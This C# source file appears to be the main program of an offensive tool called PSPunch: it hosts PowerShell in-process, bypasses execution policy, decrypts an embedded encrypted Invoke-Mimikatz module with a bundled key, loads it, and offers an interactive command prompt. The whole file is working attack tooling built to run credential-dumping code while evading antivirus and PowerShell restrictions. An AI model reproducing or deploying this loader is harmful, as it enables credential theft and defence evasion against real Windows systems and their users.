using PSPunch.PSPunchShell;
using System;
using System.Configuration;
using System.Management.Automation.Runspaces;
using PSPunch.CryptUtil;
using System.IO;
using System.Text;
using System.Reflection;

namespace PSPunch
{
    class Program
    {
        public static Runspace PSInit(PSPunchHost host)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace(host);
            runspace.Open();
            PSExec(runspace, host, "set-executionpolicy bypass -Scope process -Force");
            return runspace;

        }
        public static void ImportModules(Runspace runspace, PSPunchHost host, Stream moduleStream)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            StreamReader keyReader = new StreamReader(assembly.GetManifestResourceStream("PSPunch.Modules.key.txt"));
            string key = keyReader.ReadToEnd();
            MemoryStream decMem = FileTools.DecryptFile(moduleStream, key);
            string module = Encoding.Unicode.GetString(decMem.ToArray());
            PSExec(runspace, host, module);
        }

        public static string PSExec(Runspace runspace, PSPunchHost host, string command)
        {
            using (Pipeline pipeline = runspace.CreatePipeline())
            {
                pipeline.Commands.AddScript(command);
                pipeline.Commands[0].MergeMyResults(PipelineResultTypes.Error, PipelineResultTypes.Output); pipeline.Commands.Add("out-default");
                pipeline.Invoke();
            }
            return ((PSPunchHostUserInterface)host.UI).Output;
        }

        static void Main(string[] args)
        {
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.Clear();
            PSPunchHost host = new PSPunchHost();
            Runspace runspace = PSInit(host);
            Assembly assembly = Assembly.GetExecutingAssembly();
            Stream moduleStream = assembly.GetManifestResourceStream("PSPunch.Modules.invoke-mimikatz.ps1.enc");
            ImportModules(runspace, host, moduleStream);
            String cmd = null;
            while (cmd != "exit")
            {
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("PSPUNCH! #> ");
                Console.ForegroundColor = ConsoleColor.Yellow;
                cmd = Console.ReadLine();
                if (cmd == "exit")
                {
                    return;
                }
                string output = PSExec(runspace, host, cmd);
                Console.Write(output);
            }
        }
    }
}